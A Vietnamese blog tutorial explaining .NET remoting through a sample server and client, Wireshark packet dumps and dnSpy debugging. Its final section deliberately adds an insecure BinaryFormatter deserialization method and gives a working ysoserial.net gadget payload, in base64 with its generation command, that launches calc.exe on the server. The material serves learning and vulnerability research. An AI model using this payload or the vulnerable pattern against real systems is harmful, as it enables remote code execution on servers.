# Tản mạn
Đã một thời gian khá dài kể từ bài viết cuối của mình, do thời gian qua mình cũng bận việc học hành trên trường không có nghiên cứu được gì hay ho để mà viết bài. Gần đây thì mình có đi tìm hiểu và phân tích một CVE của Veeam đó là CVE-2022-26503 (bài phân tích mình sẽ up lên sau khi mình chỉnh sửa lại một số chỗ).

Khi mà đi vào phân tích thì mình có nhận thấy veeam agent này có sử dụng .NET remoting để giao tiếp giữa các thành phần.  Well! Lúc đó mình còn không biết .NET remoting là gì, không biết thì làm sao mà đi phân tích tiếp được. Và mình đi lục lọi trên google và có tìm được một bài viết rất là chi tiết :[https://parsiya.net/blog/2015-11-14-intro-to-.net-remoting-for-hackers/](https://parsiya.net/blog/2015-11-14-intro-to-.net-remoting-for-hackers/). Bài viết bao quát từ khái niệm, cách triển khai cũng như là cách khai thác dẫn tới lỗ hổng RCE...

Lưu ý rằng là mình cũng đọc bài viết trên và trình bày lại dưới cách hiểu của mình, nên bạn nào muốn đọc đầy đủ có thể đọc link bài viết gốc bên trên nhé. >_<.


# Một số thành phần và công cụ cần thiết
* dnSpy: để decompile và debug code C#
* Wireshark: để bắt và phân tích gói tin.
* Visual Studio: để code một số ứng dụng đơn giản.

# Giới thiệu về .NET remoting
Nói một cách đơn giản thì một ứng dụng (gọi là server) sẽ tạo ra một số *remotable object* (nghĩa là đối tượng có thể gọi từ xa). Và các ứng dụng khác (hiểu là client) tạo thể hiện của các đối tượng đó và coi chúng như là các đối tượng cục bộ. Tuy nhiên thì các đối tượng cục bộ này lại được thực thi ở phía server (tức là khi client sử dụng các đối tượng cục bộ này thực hiện một method nào đó thì thực chất method này đang được thực hiện ở trên server và trả kết quả về cho client). Thông thường thì các *remotable object* nằm trong một thư viện (VD: DLL) mà cả client và server đều sử dụng bản sao của thư viện này.

Đó là cách hoạt động đơn giản của .NET remoting. Cơ chế của .NET remoting khá giống với Java RMI. Và một lưu ý quan trọng là .NET remoting đã không được hỗ trợ nữa. Tuy nhiên thì một số phần mềm vẫn sử dụng những công nghệ cũ này và dẫn đến những lỗ hổng nghiêm trọng, câu chuyện về nó tôi sẽ đề cập đến ở trong bài đăng sau :>.

# Quy trình gửi và nhận gói tin thông qua .NET remoting
Quy trình gửi nhận gói tin các bạn có thể đọc thông qua doc ở link sau: [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrtp/4b6dd293-3901-4f64-9f51-a7d06b2b8cd3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrtp/4b6dd293-3901-4f64-9f51-a7d06b2b8cd3), gồm các mục `3.2.5`và `3.3.4.2`.

## Ở phía client
* Serialize request.
    - Serialize request ở dạng Binary Format.
    - Serialize request ở dạng SOAP format.
* Gửi message đến server.
* Chờ phản hồi từ server
* Đọc phản hồi từ connection stream
* Deserialize nội dung của response message
* Đưa giá trị sau khi deserialize đến lớp đã gọi Remote Method.

## Ở phía server
* Tiếp nhận message được gửi lên từ client.
*  Xử lý Message Frame: tùy thuộc vào kiểu transport như TCP, SOAP hay HTTP.
*  Liên kết đến đối tượng phía server.
*  Deserialze nội dung của request message.
*  Dispatching the Call
*  Serialize response mesage
*  Gửi Response
*  Nếu một trong các bước trên gặp lỗi ví dụ không tìm thấy đối tượng mà client gọi ở server, server sẽ trả về exception cho client.
# Xây dựng một ứng dụng sử dụng .NET remoting
Ứng dụng của chúng ta sẽ bao gồm 3 phần:
* Remoting library: File DLL chứa các *remotable object*
* Server
* Client

Bước đầu tiên chúng ta sẽ xây dựng Remoting Library như sau:
```Csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RemotingSample
{
    public class RemoteMath : MarshalByRefObject //class RemoteMath kế thừa class MarshalByRefObject nhằm đánh dấu rằng nó remotable 
    {
        public int Add(int a, int b)    // add
        {
            Console.WriteLine("Add({0},{1}) called", a, b);
            return a + b;
        }

        public int Sub(int a, int b)    // subtract
        {
            Console.WriteLine("Sub({0},{1}) called", a, b);
            return a - b;
        }
    }
}
```

Tiếp theo sẽ là code server

```Csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;

namespace RemotingSample
{
    class Server
    {
        static void Main(string[] args)
        {
            // tạo một TCP channel và lắng nghe ở cổng 8888
            TcpChannel remotingChannel = new TcpChannel(8888);

            // đăng kí channel, tham số thứ 2 là ensureSecurity được set là false để tắt mã hóa (encryption) và kí (signing) kênh.
            ChannelServices.RegisterChannel(remotingChannel, false);

            // tạo service mới có kiểu RemoteMath được đặt tên là "rMath" và đặt chế độ SingleCall
            // SingleCall: tạo mới object mối khi được gọi
            // ngược lại WellKnownObjectMode.Singleton thì chỉ một object được tạo cho tất cả lệnh gọi 
            WellKnownServiceTypeEntry remoteObject = new WellKnownServiceTypeEntry(typeof(RemoteMath), "rMath", WellKnownObjectMode.SingleCall);

            // đăng kí loại service remotable
            RemotingConfiguration.RegisterWellKnownServiceType(remoteObject);

            Console.WriteLine("Registered service");
            Console.WriteLine("Press any key to exit");
            Console.ReadLine();

        }
    }
}
```
Server sẽ thể hiện lớp `RemoteMath` cho đến khi phím bất kì được bấm, trong thời gian server còn hoạt động, client sẽ có thể gọi các method của class `RemoteMath`.

Code cho client như sau :

```Csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;


namespace RemotingSample
{
    class Client
    {
        static void Main(string[] args)
        {
            // tạo và đăng kí channel
            TcpChannel clientRemotingChannel = new TcpChannel();
            ChannelServices.RegisterChannel(clientRemotingChannel, false);

            // tạo một đối tượng kiểu RemothMath
            // chúng ta phải ép kiểu vì Activator.GetObject trả về một đối tượng
            // địa chỉ máy chủ là những gì chúng ta đã tạo trong Server.cs (cổng: 8888 và tên service: rMath)

            RemoteMath remoteMathObject = (RemoteMath)Activator.GetObject(typeof(RemoteMath), "tcp://localhost:8888/rMath");

            // bây giờ chúng ta có thể gọi các method Add và Sub

            Console.WriteLine("Result of Add(1, 2): {0}", remoteMathObject.Add(1, 2));
            
            Console.WriteLine("Result of Sub(10, 3): {0}", remoteMathObject.Sub(10, 3));

            Console.WriteLine("Press any key to exit");
            Console.ReadLine();
        }
    }
}
```

Toàn bộ source code có thể tìm thấy tại [đây](https://github.com/parsiya/Parsia-Code/tree/master/net-remoting). 

Sau khi build project chúng ta có file thư viện `RemotingLibrary.dll`, `Server.exe` và `Client.exe`
![image.png](https://images.viblo.asia/daaa1214-ae0f-4114-8af9-955d79660a4c.png)

Khi khởi chạy server nếu chúng ta dùng `netstat` để kiểm tra thì có thể thấy server đang lắng nghe trên tất cả các interface, có nghĩa là bất kì ai có thể kết nối đến server đều có thể thực thi các chức năng hiện có trên server.
![image.png](https://images.viblo.asia/c4eca988-f189-4566-898c-da473a0efdd1.png)

Khởi chạy cả server lẫn client và quan sát kết quả

Kết quả trên client.
![image.png](https://images.viblo.asia/4f2a545d-3037-4309-a070-f2843bb81c44.png)

Và kết quả trên server
![image.png](https://images.viblo.asia/6588c591-fe17-49f7-ac5f-63f7751f69d9.png)

Có thể quan sát được rằng kết quả của kệnh gọi được trả về cho client và function thực tế được thực hiện ở phía server (bằng chứng là message được in ra ở phía server khi client gọi đến hàm Add và Sub).

Bắt gói tin TCP khi client call function đến server và follow TCP stream ta được kết quả như sau:

![image.png](https://images.viblo.asia/681e0810-e289-4df3-836c-37b00dbabc82.png)

Thông qua tìm hiểu thì mỗi gói tin đều phải bắt đầu bằng `ProtocolId` biểu diễn bằng 4 byte `2E 4E 45 54` hay là `.NET`. 
Có thể thấy trong phần đầu gói tin gửi lên ta thấy service chúng ta muốn truy cập là `rMath` cùng với ContentTypeValue là  `application/octet-stream`

```
00000000  2e 4e 45 54 01 00 00 00  00 00 8d 00 00 00 04 00   .NET.... ........
00000010  01 01 1a 00 00 00 74 63  70 3a 2f 2f 6c 6f 63 61   ......tc p://loca
00000020  6c 68 6f 73 74 3a 38 38  38 38 2f 72 4d 61 74 68   lhost:88 88/rMath
00000030  06 00 01 01 18 00 00 00  61 70 70 6c 69 63 61 74   ........ applicat
00000040  69 6f 6e 2f 6f 63 74 65  74 2d 73 74 72 65 61 6d   ion/octe t-stream
00000050  00 00                                              ..
```
Phần tiếp theo là thân của gói tin cho chúng ta biết về class chúng ta truy cập là `RemoteMath` nằm trong namespace `RemotingSample` và đặt trong thư viện `RemotingLibrary` cùng với method ta gọi là `Add`. Tham số truyền vào method Add ở dòng cuối cùng của gói tin `01 00 00 00` và `02 00 00 00`

```
00000052  00 00 00 00 00 00 00 00  00 01 00 00 00 00 00 00   ........ ........
00000062  00 15 12 00 00 00 12 03  41 64 64 12 61 52 65 6d   ........ Add.aRem
00000072  6f 74 69 6e 67 53 61 6d  70 6c 65 2e 52 65 6d 6f   otingSam ple.Remo
00000082  74 65 4d 61 74 68 2c 20  52 65 6d 6f 74 69 6e 67   teMath,  Remoting
00000092  4c 69 62 72 61 72 79 2c  20 56 65 72 73 69 6f 6e   Library,  Version
000000A2  3d 31 2e 30 2e 30 2e 30  2c 20 43 75 6c 74 75 72   =1.0.0.0 , Cultur
000000B2  65 3d 6e 65 75 74 72 61  6c 2c 20 50 75 62 6c 69   e=neutra l, Publi
000000C2  63 4b 65 79 54 6f 6b 65  6e 3d 6e 75 6c 6c 02 00   cKeyToke n=null..
000000D2  00 00 08 01 00 00 00 08  02 00 00 00 0b            ........ .....
```

Để hiểu rõ hơn về cấu trúc gói tin các bạn nên đọc ở link sau: [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/75b9fe09-be15-475f-85b8-ae7b7558cfe5](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/75b9fe09-be15-475f-85b8-ae7b7558cfe5).

Kết quả trả về là `03 00 00 00` là kết quả của lệnh gọi trên.

```
    00000000  2e 4e 45 54 01 00 02 00  00 00 1c 00 00 00 00 00   .NET.... ........
    00000010  00 00 00 00 00 00 00 00  00 01 00 00 00 00 00 00   ........ ........
    00000020  00 16 11 08 00 00 08 03  00 00 00 0b               ........ ....
   ```
Nếu đọc binary bằng wireshark quá khó hiểu đối với bạn thì phần tiếp theo là dành cho bạn, chúng ta sẽ xem message của chúng ta thực sự được xử lý và trả về như thế nào trong code C#.

# Cách xem thông tin request và response message với dnSpy
Phần này tôi mặc định bạn đã biết cách debug bằng dnSpy. Sau khi load client.exe vào dnSpy, các bạn đặt breakpoint tại dòng 8 và tiến hành start.

![image.png](https://images.viblo.asia/eee7662d-3f99-4ec5-8112-af16dae74a04.png)

`Step into` vào nơi chúng ta đặt breakpoint ta sẽ nhảy vào `CommonLanguageRuntimeLibrary.System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke()`
![](https://images.viblo.asia/eff58f4f-f6b9-4ac5-bd6e-754241a23c81.png)

Lưu ý hiện tại `type=1`nên khối if đầu tiên được thực thi. Tiếp tục nhảy vào trong khối if này ta có thể xem được request message của chúng ta.

![image.png](https://images.viblo.asia/4ec23bd5-ddf1-4921-af00-ce4d0d54d57d.png)

cuối cùng thì kết quả sẽ được trả về ở `message2`
![image.png](https://images.viblo.asia/56009d08-88c0-4283-b7dc-e0ca263ff3b9.png)

Phần tiếp theo ta sẽ xem xét liệu rằng hacker sẽ lợi dụng .NET remoting để thực hiện tấn công như thế nào. 

# Tái tạo lại lỗ hổng
Để tạo lại lỗ hổng, tôi sửa lại thư viện `RemotingLibrary` như sau:

```Csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Serialization.Formatters.Binary;

namespace RemotingSample
{
    public class RemoteMath : MarshalByRefObject //class RemoteMath is derived from MarshalByRefObject to make it remotable
    {
        public int Add(int a, int b)    // add
        {
            Console.WriteLine("Add({0},{1}) called", a, b);
            return a + b;
        }

        public int Sub(int a, int b)    // subtract
        {
            Console.WriteLine("Sub({0},{1}) called", a, b);
            return a - b;
        }
        public object Deserialize(String encodeString)
        {
            object obj = null;
            using (MemoryStream mem = new MemoryStream(Convert.FromBase64String(encodeString)))

            {
                BinaryFormatter binaryFormatter = new BinaryFormatter();

                obj = binaryFormatter.Deserialize(mem);

            }
            return obj;
        }
    }
}
```
Với thư viện như trên, hacker có thể lợi dụng method Deserialize để có thể thực thi lệnh tùy ý trên server (lỗ hổng .NET deserialize). Vậy lợi dụng như thế nào, trong bài gốc, tác giả trình bày cách khai thác dựa trên việc sửa đổi IL Instruction với dnSpy. Đấy là trong trường hợp bạn không thể đăng kí channel với server. Vậy nếu như chúng ta có thể đăng kí với server, trong trường hợp này tôi sửa đổi trực tiếp client để gọi đến method Deserialize và truyền payload RCE vào như sau:
```Csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;


namespace RemotingSample
{
    class Client
    {
        static void Main(string[] args)
        {
            // tạo và đăng kí channel
            TcpChannel clientRemotingChannel = new TcpChannel();
            ChannelServices.RegisterChannel(clientRemotingChannel, false);

            // tạo một đối tượng kiểu RemothMath
            // chúng ta phải ép kiểu vì Activator.GetObject trả về một đối tượng
            // địa chỉ máy chủ là những gì chúng ta đã tạo trong Server.cs (cổng: 8888 và tên service: rMath)

            RemoteMath remoteMathObject = (RemoteMath)Activator.GetObject(typeof(RemoteMath), "tcp://localhost:8888/rMath");

            // bây giờ chúng ta có thể gọi các method Add và Sub, Deserialize
            String payload = "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uSWRlbnRpdHlNb2RlbCwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAADBTeXN0ZW0uSWRlbnRpdHlNb2RlbC5Ub2tlbnMuU2Vzc2lvblNlY3VyaXR5VG9rZW4BAAAADFNlc3Npb25Ub2tlbgcCAgAAAAkDAAAADwMAAADFBQAAAkAUU2VjdXJpdHlDb250ZXh0VG9rZW5AB1ZlcnNpb26DQBlTZWN1cmVDb252ZXJzYXRpb25WZXJzaW9umShodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzAyL3NjQAJJZINACUNvbnRleHRJZINAA0tleZ8BAUANRWZmZWN0aXZlVGltZYNACkV4cGlyeVRpbWWDQBBLZXlFZmZlY3RpdmVUaW1lg0ANS2V5RXhwaXJ5VGltZYNAD0NsYWltc1ByaW5jaXBhbEAKSWRlbnRpdGllc0AISWRlbnRpdHlADkJvb3RTdHJhcFRva2VumsgEQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFGNU5hV055YjNOdlpuUXVVRzkzWlhKVGFHVnNiQzVGWkdsMGIzSXNJRlpsY25OcGIyNDlNeTR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmowek1XSm1NemcxTm1Ga016WTBaVE0xQlFFQUFBQkNUV2xqY205emIyWjBMbFpwYzNWaGJGTjBkV1JwYnk1VVpYaDBMa1p2Y20xaGRIUnBibWN1VkdWNGRFWnZjbTFoZEhScGJtZFNkVzVRY205d1pYSjBhV1Z6QVFBQUFBOUdiM0psWjNKdmRXNWtRbkoxYzJnQkFnQUFBQVlEQUFBQXRnVThQM2h0YkNCMlpYSnphVzl1UFNJeExqQWlJR1Z1WTI5a2FXNW5QU0oxZEdZdE9DSS9QZzBLUEU5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2lCTlpYUm9iMlJPWVcxbFBTSlRkR0Z5ZENJZ1NYTkpibWwwYVdGc1RHOWhaRVZ1WVdKc1pXUTlJa1poYkhObElpQjRiV3h1Y3owaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3dmNISmxjMlZ1ZEdGMGFXOXVJaUI0Yld4dWN6cHpaRDBpWTJ4eUxXNWhiV1Z6Y0dGalpUcFRlWE4wWlcwdVJHbGhaMjV2YzNScFkzTTdZWE56WlcxaWJIazlVM2x6ZEdWdElpQjRiV3h1Y3pwNFBTSm9kSFJ3T2k4dmMyTm9aVzFoY3k1dGFXTnliM052Wm5RdVkyOXRMM2RwYm1aNEx6SXdNRFl2ZUdGdGJDSStEUW9nSUR4UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVQySnFaV04wU1c1emRHRnVZMlUrRFFvZ0lDQWdQSE5rT2xCeWIyTmxjM00rRFFvZ0lDQWdJQ0E4YzJRNlVISnZZMlZ6Y3k1VGRHRnlkRWx1Wm04K0RRb2dJQ0FnSUNBZ0lEeHpaRHBRY205alpYTnpVM1JoY25SSmJtWnZJRUZ5WjNWdFpXNTBjejBpTDJNZ1kyRnNZeTVsZUdVaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09AQEBAQEL";

            Console.WriteLine("Result of Deser: {0}", remoteMathObject.Deserialize(payload));
            
            Console.WriteLine("Result of Sub(10, 3): {0}", remoteMathObject.Sub(10, 3));

            Console.WriteLine("Press any key to exit");
            Console.ReadLine();
        }
    }
}

```

Trong đó payload được gen bởi ysoserial .net như sau: 

` .\ysoserial.exe -f BinaryFormatter -g SessionSecurityToken -o base64 -c "calc.exe"`

Sau khi build lại project, chúng ta chạy server và client, nhận thấy popup calc được bật lên thành công.  Cụ thể lỗ hổng .NET deserialize mong các bạn tìm hiểu thêm, mục tiêu của tôi ở đây là chỉ ra cách mà chúng ta có thể khai thác thông qua .NET remoting khi mà server tồn tại các function nguy hiểm.
![](https://images.viblo.asia/88e06735-6558-4679-a74d-4f502d7832a0.gif)
# Kết luận
Mình cũng mới tìm hiểu về .NET remoting nên có thể có chỗ sai sót, bạn đọc nếu phát hiện chỗ sai hoặc có góp ý hy vọng hãy cho mình biết. Mình xin cảm ơn.